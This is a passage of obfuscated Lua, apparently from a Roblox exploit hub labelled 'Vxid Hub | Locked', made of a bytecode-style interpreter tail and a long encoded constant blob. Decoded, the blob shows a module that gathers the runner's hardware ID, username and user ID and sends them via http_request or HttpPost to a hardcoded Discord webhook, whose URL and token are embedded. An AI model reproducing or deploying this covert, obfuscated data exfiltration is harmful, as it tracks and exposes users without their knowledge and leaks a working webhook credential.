				end
				v72 = v72 + ((1 + 1) - 1)
			end
		end
	end
	return v29(v28(), {}, v17)(...)
end
return v15(
	"LOL!1F3Q0003043Q0067616D65030A3Q0047657453657276696365030B3Q00482Q74705365727669636503073Q00506C6179657273030B3Q00574542482Q4F4B5F55524C03793Q00682Q7470733A2Q2F646973636F72642E636F6D2F6170692F776562682Q6F6B732F313439323Q39303230382Q363536383335342F4A766C545153493756644B35596330544A4971723837354F305A5954654B442Q4850767446706A45433261327A49444A2Q4C774E33344371434244506A6E7452464F793103083Q00424F545F4E414D4503113Q005678696420487562207C204C6F636B6564030E3Q00424F545F4156415441525F55524C03223Q00682Q7470733A2Q2F3Q772E726F626C6F782E636F6D2F66617669636F6E2E69636F03063Q00434F4C4F52532Q033Q00524544025Q00E06F4103053Q0047522Q454E025Q00E0EF4003043Q00424C5545025Q00E06F4003063Q0059452Q4C4F57024Q00E0FF6F4103043Q004359414E024Q00E0FFEF4003063Q00505552504C45023Q00E01FE06F4103063Q004F52414E4745024Q00A0F46F4103043Q0047524159024Q002Q10604103043Q0053656E64030C3Q0053656E64416476616E63656403093Q0053656E644261746368030A3Q00536574576562682Q6F6B00343Q00124A3Q00013Q0020025Q0002001234000200034Q00463Q0002000200124A000100013Q002002000100010002001234000300044Q00460001000300022Q004500025Q00304800020005000600304800020007000800304800020009000A2Q004500033Q00080030480003000C000D0030480003000E000F0030480003001000110030480003001200130030480003001400150030480003001600170030480003001800190030480003001A001B0010400002000B000300021D00035Q00021D000400013Q00021D000500023Q00021D000600033Q00021D000700043Q002Q0600080005000100062Q00033Q00034Q00033Q00044Q00033Q00054Q00038Q00033Q00074Q00033Q00063Q0010400002001C0008002Q0600080006000100062Q00033Q00064Q00033Q00034Q00033Q00044Q00033Q00054Q00038Q00033Q00073Q0010400002001D0008002Q0600080007000100022Q00038Q00033Q00073Q0010400002001E000800021D000800083Q0010400002001F00082Q0044000200024Q001A8Q00153Q00013Q00093Q00043Q0003043Q007479706503073Q006765746877696403083Q0066756E6374696F6E03123Q00485749445F4E4F545F415641494C41424C45000C3Q00124A3Q00013Q00124A000100024Q001E3Q0002000200260F3Q00090001000300042E3Q0009000100124A3Q00024Q00053Q00014Q00297Q00042E3Q000B00010012343Q00044Q00443Q00024Q00153Q00017Q00043Q0003043Q006D61746803053Q00666C2Q6F7203023Q006F7303043Q0074696D6500083Q00124A3Q00013Q0020475Q000200124A000100033Q0020470001000100042Q0049000100019Q004Q00298Q00153Q00017Q00033Q0003023Q006F7303043Q006461746503113Q0025592D256D2D25642025483A254D3A255301073Q00124A000100013Q002047000100010002001234000200034Q004200036Q001B000100034Q002900016Q00153Q00017Q00023Q00033A3Q00682Q7470733A2Q2F3Q772E726F626C6F782E636F6D2F7468756D626E61696C2F6176617461722D627573742F696D6167653F7573657249643D03203Q002677696474683D343230266865696768743D34323026666F726D61743D706E6701063Q001234000100014Q004200025Q001234000300024Q003A0001000100032Q0044000100024Q00153Q00017Q00093Q00028Q00026Q00F03F03053Q007063612Q6C03043Q007761726E031C3Q00E29D8C20576562682Q6F6B2072657175657374206661696C65643A2003083Q00746F737472696E67030C3Q00682Q74705F7265717565737403083Q00482Q7470506F737403463Q00E29AA0EFB88F20682Q74705F72657175657374206E6F7420617661696C61626C65202D2072752Q6E696E6720696E206E6F6E2D6578706C6F697420656E7669726F6E6D656E7402353Q001234000200014Q0030000300053Q00260F0002001F0001000200042E3Q001F000100124A000600033Q002Q0600073Q000100032Q00033Q00034Q00038Q00033Q00014Q00390006000200072Q0042000500074Q0042000400063Q00060E0004001100013Q00042E3Q001100012Q0010000600014Q0044000600023Q00042E3Q00340001001234000600013Q00260F000600120001000100042E3Q0012000100124A000700043Q001234000800053Q00124A000900064Q0042000A00054Q001E0009000200022Q003A0008000800092Q003E0007000200012Q001000076Q0044000700023Q00042E3Q0012000100042E3Q0034000100260F000200020001000100042E3Q0002000100124A000600073Q000633000300270001000600042E3Q00270001000609000300270001000100042E3Q0027000100124A000300083Q000609000300320001000100042E3Q00320001001234000600013Q00260F0006002A0001000100042E3Q002A000100124A000700043Q001234000800094Q003E0007000200012Q001000076Q0044000700023Q00042E3Q002A0001001234000200023Q00042E3Q000200012Q00153Q00013Q00013Q00073Q002Q033Q0055726C03043Q00426F647903063Q004D6574686F6403043Q00504F535403073Q0048656164657273030C3Q00436F6E74656E742D5479706503103Q00612Q706C69636174696F6E2F6A736F6E000D4Q00188Q004500013Q00042Q0018000200013Q0010400001000100022Q0018000200023Q0010400001000200020030480001000300042Q004500023Q00010030480002000600070010400001000500022Q001B3Q00014Q00298Q00153Q00017Q00353Q00028Q00026Q00F03F027Q0040030B3Q005573657220416374696F6E03133Q004E6F206D652Q736167652070726F766964656403053Q007469746C65030B3Q006465736372697074696F6E03053Q00636F6C6F7203093Q007468756D626E61696C2Q033Q0075726C03063Q00686569676874026Q00704003053Q00776964746803063Q006669656C647303043Q006E616D65030D3Q00F09F91A420557365726E616D6503053Q0076616C756503063Q00696E6C696E652Q01030C3Q00F09F8694205573657220494403083Q00746F737472696E6703093Q00F09F949020485749442Q033Q003Q600100030D3Q00E28FB02054696D657374616D7003083Q002028556E69783A2003013Q002903063Q00662Q6F74657203043Q007465787403083Q00424F545F4E414D4503083Q0069636F6E5F75726C030E3Q00424F545F4156415441525F55524C03093Q0074696D657374616D7003023Q006F7303043Q006461746503133Q002125592D256D2D25645425483A254D3A25535A03083Q00757365726E616D65030A3Q006176617461725F75726C03063Q00656D62656473026Q00084003063Q00434F4C4F525303043Q00424C554503053Q007072696E7403223Q00E29C8520576562682Q6F6B2073656E742073752Q63652Q7366752Q6C7920666F722003043Q007761726E031F3Q00E29D8C204661696C656420746F2073656E6420776562682Q6F6B20666F7220030A3Q004A534F4E456E636F6465030B3Q00574542482Q4F4B5F55524C034Q0003053Q00652Q726F7203413Q00E29AA0EFB88F20576562682Q6F6B2055524C206E6F7420636F6E66696775726564212053657420446973636F7264576562682Q6F6B2E574542482Q4F4B5F55524C03063Q0055736572496403043Q004E616D6505A43Q001234000500014Q00300006000F3Q001234001000013Q00260F001000690001000200042E3Q0069000100260F0005004C0001000300042E3Q004C00010006090002000A0001000100042E3Q000A0001001234000200043Q0006090003000D0001000100042E3Q000D0001001234000300054Q004500113Q00070010400011000600020010400011000700030010400011000800042Q004500123Q00030010400012000A00080030480012000B000C0030480012000D000C0010400011000900122Q0045001200044Q004500133Q00030030480013000F00100010400013001100070030480013001200132Q004500143Q00030030480014000F001400124A001500154Q0042001600064Q001E0015000200020010400014001100150030480014001200132Q004500153Q00030030480015000F0016001234001600174Q0042001700093Q001234001800174Q003A0016001600180010400015001100160030480015001200182Q004500163Q00030030480016000F00192Q00420017000B3Q0012340018001A4Q00420019000A3Q001234001A001B4Q003A00170017001A0010400016001100170030480016001200182Q00160012000400010010400011000E00122Q004500123Q000200204700133Q001E0010400012001D001300204700133Q00200010400012001F00130010400011001C001200124A001200223Q002047001200120023001234001300244Q001E0012000200020010400011002100122Q0042000C00114Q004500113Q000300204700123Q001E00104000110025001200204700123Q00200010400011002600122Q0045001200014Q00420013000C4Q00160012000100010010400011002700122Q0042000D00113Q001234000500283Q00260F000500020001000200042E3Q00020001001234001100013Q00260F001100580001000100042E3Q005800012Q001800126Q002A0012000100022Q0042000900124Q0018001200014Q002A0012000100022Q0042000A00123Q001234001100023Q00260F0011005C0001000300042E3Q005C0001001234000500033Q00042E3Q0002000100260F0011004F0001000200042E3Q004F00012Q0018001200024Q00420013000A4Q001E0012000200022Q0042000B00123Q000609000400660001000100042E3Q0066000100204700123Q002900204700040012002A001234001100033Q00042E3Q004F000100042E3Q0002000100260F001000030001000100042E3Q0003000100260F0005008C0001002800042E3Q008C0001001234001100013Q00260F0011007E0001000200042E3Q007E000100060E000F007800013Q00042E3Q0078000100124A0012002B3Q0012340013002C4Q0042001400074Q003A0013001300142Q003E00120002000100042E3Q007D000100124A0012002D3Q0012340013002E4Q0042001400074Q003A0013001300142Q003E0012000200012Q0044000F00023Q00260F0011006E0001000100042E3Q006E00012Q0018001200033Q00200200120012002F2Q00420014000D4Q00460012001400022Q0042000E00124Q0018001200043Q00204700133Q00302Q00420014000E4Q00460012001400022Q0042000F00123Q001234001100023Q00042E3Q006E000100260F000500A00001000100042E3Q00A0000100204700113Q003000060E0011009400013Q00042E3Q0094000100204700113Q003000260F001100990001003100042E3Q0099000100124A001100323Q001234001200334Q003E0011000200012Q001000116Q0044001100023Q0020470006000100340020470007000100352Q0018001100054Q0042001200064Q001E0011000200022Q0042000800113Q001234000500023Q001234001000023Q00042E3Q0003000100042E3Q000200012Q00153Q00017Q00353Q00030B3Q00574542482Q4F4B5F55524C034Q00028Q0003053Q00652Q726F7203413Q00E29AA0EFB88F20576562682Q6F6B2055524C206E6F7420636F6E66696775726564212053657420446973636F7264576562682Q6F6B2E574542482Q4F4B5F55524C03063Q0055736572496403043Q004E616D6503063Q00434F4C4F525303043Q00424C5545030B3Q005573657220416374696F6E03133Q004E6F206D652Q736167652070726F766964656403043Q006E616D65030D3Q00F09F91A420557365726E616D6503053Q0076616C756503063Q00696E6C696E652Q01030C3Q00F09F8694205573657220494403083Q00746F737472696E6703093Q00F09F949020485749442Q033Q003Q600100030D3Q00E28FB02054696D657374616D7003083Q002028556E69783A2003013Q002903063Q0069706169727303053Q007461626C6503063Q00696E7365727403053Q007469746C65030B3Q006465736372697074696F6E03053Q00636F6C6F7203093Q007468756D626E61696C2Q033Q0075726C03063Q00686569676874026Q00704003053Q00776964746803063Q006669656C647303063Q00662Q6F74657203043Q007465787403083Q00424F545F4E414D4503083Q0069636F6E5F75726C030E3Q00424F545F4156415441525F55524C03093Q0074696D657374616D7003023Q006F7303043Q006461746503133Q002125592D256D2D25645425483A254D3A25535A03083Q00757365726E616D65030A3Q006176617461725F75726C03063Q00656D62656473030A3Q004A534F4E456E636F646503053Q007072696E7403223Q00E29C8520576562682Q6F6B2073656E742073752Q63652Q7366752Q6C7920666F722003043Q007761726E031F3Q00E29D8C204661696C656420746F2073656E6420776562682Q6F6B20666F7220068B3Q00204700063Q000100060E0006000600013Q00042E3Q0006000100204700063Q000100260F000600130001000200042E3Q00130001001234000600033Q00260F000600070001000300042E3Q00070001001234000700033Q00260F0007000A0001000300042E3Q000A000100124A000800043Q001234000900054Q003E0008000200012Q001000086Q0044000800023Q00042E3Q000A000100042E3Q000700010020470006000100060020470007000100072Q001800086Q0042000900064Q001E0008000200022Q0018000900014Q002A0009000100022Q0018000A00024Q002A000A000100022Q0018000B00034Q0042000C000A4Q001E000B00020002000609000500230001000100042E3Q00230001002047000C3Q00080020470005000C0009000609000200260001000100042E3Q002600010012340002000A3Q000609000300290001000100042E3Q002900010012340003000B3Q0006090004002D0001000100042E3Q002D00012Q0045000C6Q00420004000C4Q0045000C00044Q0045000D3Q0003003048000D000C000D001040000D000E0007003048000D000F00102Q0045000E3Q0003003048000E000C001100124A000F00124Q0042001000064Q001E000F00020002001040000E000E000F003048000E000F00102Q0045000F3Q0003003048000F000C0013001234001000144Q0042001100093Q001234001200144Q003A001000100012001040000F000E0010003048000F000F00152Q004500103Q00030030480010000C00162Q00420011000B3Q001234001200174Q00420013000A3Q001234001400184Q003A0011001100140010400010000E00110030480010000F00152Q0016000C0004000100124A000D00194Q0042000E00044Q0039000D0002000F00042E3Q0054000100124A0012001A3Q00204700120012001B2Q00420013000C4Q0042001400114Q002600120014000100060B000D004F0001000200042E3Q004F00012Q0045000D3Q0007001040000D001C0002001040000D001D0003001040000D001E00052Q0045000E3Q0003001040000E00200008003048000E00210022003048000E00230022001040000D001F000E001040000D0024000C2Q0045000E3Q0002002047000F3Q0027001040000E0026000F002047000F3Q0029001040000E0028000F001040000D0025000E00124A000E002B3Q002047000E000E002C001234000F002D4Q001E000E00020002001040000D002A000E2Q0045000E3Q0003002047000F3Q0027001040000E002E000F002047000F3Q0029001040000E002F000F2Q0045000F00014Q00420010000D4Q0016000F00010001001040000E0030000F2Q0018000F00043Q002002000F000F00312Q00420011000E4Q0046000F001100022Q0018001000053Q00204700113Q00012Q00420012000F4Q004600100012000200060E0010008400013Q00042E3Q0084000100124A001100323Q001234001200334Q0042001300074Q003A0012001200132Q003E00110002000100042E3Q0089000100124A001100343Q001234001200354Q0042001300074Q003A0012001200132Q003E0011000200012Q0044001000024Q00153Q00017Q00123Q00028Q00026Q00F03F030B3Q00574542482Q4F4B5F55524C034Q0003053Q00652Q726F7203413Q00E29AA0EFB88F20576562682Q6F6B2055524C206E6F7420636F6E66696775726564212053657420446973636F7264576562682Q6F6B2E574542482Q4F4B5F55524C03083Q00757365726E616D6503083Q00424F545F4E414D45030A3Q006176617461725F75726C030E3Q00424F545F4156415441525F55524C03063Q00656D62656473030A3Q004A534F4E456E636F6465027Q004003053Q007072696E74031C3Q00E29C8520426174636820776562682Q6F6B2073656E7420776974682003093Q0020656D62656428732903043Q007761726E03203Q00E29D8C204661696C656420746F2073656E6420626174636820776562682Q6F6B02573Q001234000200014Q0030000300053Q001234000600013Q00260F000600290001000200042E3Q0029000100260F000200020001000100042E3Q0002000100204700073Q000300060E0007000D00013Q00042E3Q000D000100204700073Q000300260F000700200001000400042E3Q00200001001234000700014Q0030000800083Q00260F0007000F0001000100042E3Q000F0001001234000800013Q00260F000800120001000100042E3Q00120001001234000900013Q00260F000900150001000100042E3Q0015000100124A000A00053Q001234000B00064Q003E000A000200012Q0010000A6Q0044000A00023Q00042E3Q0015000100042E3Q0012000100042E3Q0020000100042E3Q000F00012Q004500073Q000300204700083Q000800104000070007000800204700083Q000A0010400007000900080010400007000B00012Q0042000300073Q001234000200023Q00042E3Q0002000100260F000600030001000100042E3Q0003000100260F000200400001000200042E3Q00400001001234000700013Q000E0A0001003B0001000700042E3Q003B00012Q001800085Q00200200080008000C2Q0042000A00034Q00460008000A00022Q0042000400084Q0018000800013Q00204700093Q00032Q0042000A00044Q00460008000A00022Q0042000500083Q001234000700023Q000E0A0002002E0001000700042E3Q002E00010012340002000D3Q00042E3Q0040000100042E3Q002E0001000E0A000D00530001000200042E3Q00530001001234000700013Q000E0A000100430001000700042E3Q0043000100060E0005004E00013Q00042E3Q004E000100124A0008000E3Q0012340009000F4Q0032000A00013Q001234000B00104Q003A00090009000B2Q003E00080002000100042E3Q0051000100124A000800113Q001234000900124Q003E0008000200012Q0044000500023Q00042E3Q00430001001234000600023Q00042E3Q0003000100042E3Q000200012Q00153Q00017Q00073Q00028Q00026Q00F03F030E3Q00424F545F4156415441525F55524C03053Q007072696E7403183Q00E29C8520576562682Q6F6B20636F6E666967757265643A20030B3Q00574542482Q4F4B5F55524C03083Q00424F545F4E414D4504153Q001234000400013Q00260F0004000C0001000200042E3Q000C000100060E0003000600013Q00042E3Q000600010010403Q0003000300124A000500043Q001234000600054Q0042000700014Q003A0006000600072Q003E00050002000100042E3Q0014000100260F000400010001000100042E3Q000100010010403Q0006000100060E0002001200013Q00042E3Q001200010010403Q00070002001234000400023Q00042E3Q000100012Q00153Q00017Q00",
	v9(),
	...
)
